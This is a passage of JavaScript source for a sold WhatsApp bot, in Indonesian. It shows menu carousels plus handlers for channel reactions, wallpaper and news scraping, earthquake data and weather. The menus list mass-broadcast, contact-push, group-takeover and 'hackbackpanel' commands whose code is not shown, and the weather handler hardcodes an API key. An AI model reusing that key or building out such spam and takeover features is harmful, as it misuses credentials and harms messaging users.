╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },

                                // ========== SLIDE 3 = OWNER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .autopromosi
┃ ϟ .autoread
┃ ϟ .autoreadsw
┃ ϟ .autotyping
┃ ϟ .addowner
┃ ϟ .addownerall
┃ ϟ .listowner
┃ ϟ .delowner
┃ ϟ .delownerall
┃ ϟ .self/public
┃ ϟ .block
┃ ϟ .unblok
┃ ϟ .setbiobot
┃ ϟ .setnamabot
┃ ϟ .clearsession
┃ ϟ .restart
┃ ϟ .addcase
┃ ϟ .delcase
┃ ϟ .getcase
┃ ϟ .editcase
┃ ϟ .spekvps
┃ ϟ .uptime
┃ ϟ .totalfitur
┃ ϟ .autoblock
┃ ϟ .backup
┃ ϟ .gconly
┃ ϟ .clearchat
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 4 = PANEL MENU V1 ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩1* ]
┃ ϟ .1gb
┃ ϟ .2gb
┃ ϟ .3gb
┃ ϟ .4gb
┃ ϟ .5gb
┃ ϟ .6gb
┃ ϟ .7gb
┃ ϟ .8gb
┃ ϟ .9gb
┃ ϟ .10gb
┃ ϟ .unlimited
┃ ϟ .createserver
┃ ϟ .cadp
┃ ϟ .cadmin
┃ ϟ .delpanel
┃ ϟ .delallserver
┃ ϟ .delalluser
┃ ϟ .deladmin
┃ ϟ .delalladmin
┃ ϟ .listpanel
┃ ϟ .listadmin
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses
┃ ϟ .addreseller
┃ ϟ .delakses
┃ ϟ .delreseller
┃ ϟ .listreseller
┃ ϟ .resetreseller
┃ ϟ .totalpanel
┃ ϟ .totaladmin
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 5 = PANEL MENU V2 ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩2* ]
┃ ϟ .1gb-v2
┃ ϟ .2gb-v2
┃ ϟ .3gb-v2
┃ ϟ .4gb-v2
┃ ϟ .5gb-v2
┃ ϟ .6gb-v2
┃ ϟ .7gb-v2
┃ ϟ .8gb-v2
┃ ϟ .9gb-v2
┃ ϟ .10gb-v2
┃ ϟ .unlimited-v2
┃ ϟ .createserver2
┃ ϟ .cadp
┃ ϟ .cadmin
┃ ϟ .delpanel-v2
┃ ϟ .delallserver-v2
┃ ϟ .delalluser-v2
┃ ϟ .deladmin-v2
┃ ϟ .delalladmin-v2
┃ ϟ .listpanel-v2
┃ ϟ .listadmin-v2
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses2
┃ ϟ .addreseller-v2
┃ ϟ .delakses2
┃ ϟ .delreseller-v2
┃ ϟ .listreseller-v2
┃ ϟ .resetreseller-v2
┃ ϟ .totalpanel-v2
┃ ϟ .totaladmin-v2
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = PROTECT MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .installprotect1
┃ ϟ .installprotect2
┃ ϟ .installprotect3
┃ ϟ .installprotect4
┃ ϟ .installprotect5
┃ ϟ .installprotect6
┃ ϟ .installprotect7
┃ ϟ .installprotect8
┃ ϟ .installprotect9
┃ ϟ .installprotect10
┃ ϟ .installprotect11
┃ ϟ .installprotect12
┃ ϟ .installprotect13
┃ ϟ .installprotect14
┃ ϟ .installprotect15
┃ ϟ .installprotect16
┃ ϟ .installprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addsp
┃ ϟ .delsp
┃ ϟ .resetsp
┃ ϟ .listsp
┃ ϟ .addop
┃ ϟ .delop
┃ ϟ .resetop
┃ ϟ .listop
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = UNPROTECT MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .uninstallprotect1
┃ ϟ .uninstallprotect2
┃ ϟ .uninstallprotect3
┃ ϟ .uninstallprotect4
┃ ϟ .uninstallprotect5
┃ ϟ .uninstallprotect6
┃ ϟ .uninstallprotect7
┃ ϟ .uninstallprotect8
┃ ϟ .uninstallprotect9
┃ ϟ .uninstallprotect10
┃ ϟ .uninstallprotect11
┃ ϟ .uninstallprotect12
┃ ϟ .uninstallprotect13
┃ ϟ .uninstallprotect14
┃ ϟ .uninstallprotect15
┃ ϟ .uninstallprotect16
┃ ϟ .uninstallprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addsp
┃ ϟ .delsp
┃ ϟ .resetsp
┃ ϟ .listsp
┃ ϟ .addop
┃ ϟ .delop
┃ ϟ .resetop
┃ ϟ .listop
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 7 = INSTALLER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .hackbackpanel
┃ ϟ .installpanel
┃ ϟ .uninstallpanel
┃ ϟ .installtema
┃ ϟ .uninstallthema
┃ ϟ .startwings
┃ ϟ .subdomain
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 8 = GROUP MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨* ]
┃ ϟ .add
┃ ϟ .kick
┃ ϟ .close
┃ ϟ .open
┃ ϟ .hidetag
┃ ϟ .kudetagc
┃ ϟ .leave
┃ ϟ .tagall
┃ ϟ .promote
┃ ϟ .demote
┃ ϟ .resetlinkgc
┃ ϟ .getdeskgc
┃ ϟ .totalmember
┃ ϟ .linkgc
┃ ϟ .bljpm
┃ ϟ .delbljpm
┃ ϟ .listdaftarjpm
┃ ϟ .listonline
┃ ϟ .listgrup
┃ ϟ .joingrup
┃ ϟ .getppgrup
┃ ϟ .getpp
┃ ϟ .buatgc
┃ ϟ .antilink
┃ ϟ .antilinkch
┃ ϟ .antikataunchek
┃ ϟ .welcome
┃ ϟ .setwelcome
┃ ϟ .setgoodbye
┃ ϟ .upswgc
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 9 = TOOLS MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨* ]
┃ ϟ .brat
┃ ϟ .tourl
┃ ϟ .tourl2
┃ ϟ .berita
┃ ϟ .ssweb
┃ ϟ .translate
┃ ϟ .infogempa
┃ ϟ .infocuaca
┃ ϟ .wallpaper
┃ ϟ .shortlink
┃ ϟ .shortlink-dl
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 10 = STORE MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addrespon
┃ ϟ .delrespon
┃ ϟ .listrespon
┃ ϟ .done
┃ ϟ .proses
┃ ϟ .jpm
┃ ϟ .jpm2
┃ ϟ .jpm3
┃ ϟ .jpmht
┃ ϟ .jpmtesti
┃ ϟ .jpmslide
┃ ϟ .jpmslideht
┃ ϟ .sendtesti
┃ ϟ .payment
┃ ϟ .pushkontak
┃ ϟ .cekidgrup
┃ ϟ .savekontak
┃ ϟ .setjedapush
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 11 = CHANNEL MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗠𝗘𝗡𝗨* ]
┃ ϟ .jpmchmenu
┃ ϟ .jpmchteks
┃ ϟ .jpmchbutton
┃ ϟ .jpmchfoto
┃ ϟ .jpmchvideo
┃ ϟ .jpmchaudio
┃ ϟ .jpmchdoc
┃ ϟ .setdelayjpmch
┃ ϟ .setbotjpmch
┃ ϟ .autojpmch
┃ ϟ .addteks
┃ ϟ .delteks
┃ ϟ .listteks
┃ ϟ .statusjpmch
┃ ϟ .jpmchjumlah
┃ ϟ .jpmchvip
┃ ϟ .addptjs
┃ ϟ .delptjs
┃ ϟ .addownjs
┃ ϟ .delownjs
┃ ϟ .addid
┃ ϟ .addidch
┃ ϟ .addallid
┃ ϟ .delid
┃ ϟ .delallid
┃ ϟ .listid
┃ ϟ .seturlsatu
┃ ϟ .seturldua
┃ ϟ .joinchannel
┃ ϟ .createch
┃ ϟ .sync
┃ ϟ .antikatach
┃ ϟ .jpmchnew
┃ ϟ .listch
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 12 = PAYMENT MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .dana
┃ ϟ .ovo
┃ ϟ .gopay
┃ ϟ .qris
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 13 = OTHER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .cekidch
┃ ϟ .cekidgc
┃ ϟ .reactch
┃ ϟ .rvo
┃ ϟ .qc
┃ ϟ .stiker
┃ ϟ .stikerwm
┃ ϟ .pinterest
┃ ϟ .buatgambar
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 14 = DOWNLOAD MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨* ]
┃ ϟ .tiktok
┃ ϟ .tiktokmp3
┃ ϟ .facebook
┃ ϟ .capcut
┃ ϟ .instagram
┃ ϟ .ytmp3
┃ ϟ .ytmp4
┃ ϟ .play
┃ ϟ .playvid
┃ ϟ .mediafire
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 15 = CREATE WEB MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗖𝗥𝗘𝗔𝗧𝗘 𝗪𝗘𝗕 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗦𝗘𝗟𝗟𝗘𝗥 𝗪𝗘𝗕* ]
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
╰━━━━━━━━━━━━━━━━━━━━`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },

                                // DAN SETERUSNYA...
                                // Abang tinggal salin setiap kategori → jadikan 1 slide
                                // Formatnya sama seperti 15 slide di atas

                            ]
                        })
                    })
                }
            }
        }, { userJid: m.sender });

        await conn.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    } catch (err) {
        console.error(err);
        Reply("❌ Terjadi error saat mengirim slide menu!");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "reactch": case "rch": {
  if (!isCreator) return Reply('*[ System Notice ]* Khusus Owner');
  if (!text) return Reply(`Gini Cok Caranya\n\ncontoh: ${prefix + command} linkpesan 😂`);
  if (!args[0] || !args[1]) return Reply("Wrong Format");
  if (!args[0].includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid");

  let result = args[0].split('/')[4];
  let serverId = args[0].split('/')[5];
  let res = await conn.newsletterMetadata("invite", result);

  // Reaction langsung dari argumen kedua dst, tanpa ubah font
  let reaction = args.slice(1).join(' ');

  await conn.newsletterReactMessage(res.id, serverId, reaction);
  Reply(`Berhasil mengirim reaction "${reaction}" ke dalam channel ${res.name}`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "wallpaper": {
  if (!text) return m.reply(`📌 *Contoh:* ${prefix + command} kamado tanjiro`);

  await m.reply('🔍 Sedang mencari wallpaper...');

  const axios = require('axios');
  const cheerio = require('cheerio');
  const { generateWAMessageContent, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: conn.waUploadToServer
    });
    return imageMessage;
  }

  async function UhdpaperSearch(query) {
    try {
      const response = await axios.get(`https://www.uhdpaper.com/search?q=${query}&by-date=true&i=0`);
      const html = response.data;
      const $ = cheerio.load(html);
      const results = [];

      $('article.post-outer-container').each((_, element) => {
        const title = $(element).find('.snippet-title h2').text().trim();
        const imageUrl = $(element).find('.snippet-title img').attr('src');
        const resolution = $(element).find('.wp_box b').text().trim();
        const link = $(element).find('a').attr('href');

        if (title && imageUrl && resolution && link) {
          results.push({ title, imageUrl, resolution, link });
        }
      });

      return results;
    } catch (error) {
      console.error('Error scraping UHDPaper:', error.message);
      return [];
    }
  }

  let hasil = await UhdpaperSearch(text);
  if (!hasil.length) return m.reply('❌ Wallpaper tidak ditemukan.');

  let i = 1;
  const carousel = [];

  for (let item of hasil.slice(0, 5)) {
    carousel.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `🖼️ Resolusi: ${item.resolution}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: '乂 U H D P A P E R'
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Wallpaper: ${text}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(item.imageUrl)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "🌐 Download Wallpaper",
              url: item.link,
              merchant_url: item.link
            })
          }
        ]
      })
    });
    i++;
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `🖼️ Berikut hasil pencarian untuk: *${text}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '乂 UHDPaper Wallpaper Search'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: carousel
          })
        })
      }
    }
  }, { quoted: m });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
  break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "berita": {
  if(!text) return m.reply('Masukan URL');
  m.reply('Mohon Tunggu');

const axios = require('axios');
const cheerio = require('cheerio');

async function BeritaDetikDetail(url) {
  try {
  const { data } = await axios.get(url);
  const $ = cheerio.load(data);

  const title = $('h1').first().text().trim();
  const author = $('.detail__author').text().trim() || $('div.author').text().trim();
  const date = $('.detail__date').text().trim() || $('div.date').text().trim();
  const image = $('.detail__media img').attr('src') || $('article img').first().attr('src');
  let description = $('article p').first().text().trim();
  if (!description) {
    description = $('meta[name="description"]').attr('content') || '';
  }

  return { title, author, date, image, description };
    } catch (error) {
    console.error('Error:', error);
    return null;
  }
}

let result = await BeritaDetikDetail(text);
if(!result) return m.reply('Gagal Memproses Anunya...');

let teks = '';
teks+= '*' + result.title + '*\n\n'
teks+= '- Author:' + result.author + '\n'
teks+= '- Date:' + result.date + '\n'
teks+= '\n'
teks+= '- Description:`' + result.description + '`\n'

conn.sendMessage(m.chat, {
  image: { url: result.image },
  caption: teks
}, { quoted: m })
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "infogempa": {
    if (!isCreator) return Reply(mess.owner)
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "infocuaca": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply ('*Silakan berikan lokasi yang ingin dicek cuacanya!*')

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        let textw = ""
        textw += `*🗺️ Cuaca di ${text}*\n\n`
        textw += `*🌤️ Cuaca:* ${wdata.data.weather[0].main}\n`
        textw += `*📖 Deskripsi:* ${wdata.data.weather[0].description}\n`
        textw += `*🌡️ Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`
        textw += `*🤒 Terasa Seperti:* ${wdata.data.main.feels_like}°C\n`
        textw += `*🌬️ Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`
        textw += `*💧 Kelembaban:* ${wdata.data.main.humidity}%\n`
        textw += `*🌪️ Kecepatan Angin:* ${wdata.data.wind.speed} m/s\n`
        textw += `*📍 Latitude:* ${wdata.data.coord.lat}\n`
        textw += `*📍 Longitude:* ${wdata.data.coord.lon}\n`
        textw += `*🌍 Negara:* ${wdata.data.sys.country}\n`

        conn.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: qtext2,
            }
        )
    } catch (error) {
        Reply('*Terjadi kesalahan! Pastikan lokasi yang Anda masukkan benar.*')
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm3": {
 if (!isCreator) return m.reply(mess.owner);
 if (!q) return m.reply(example("*teks dengan mengirim video*"));
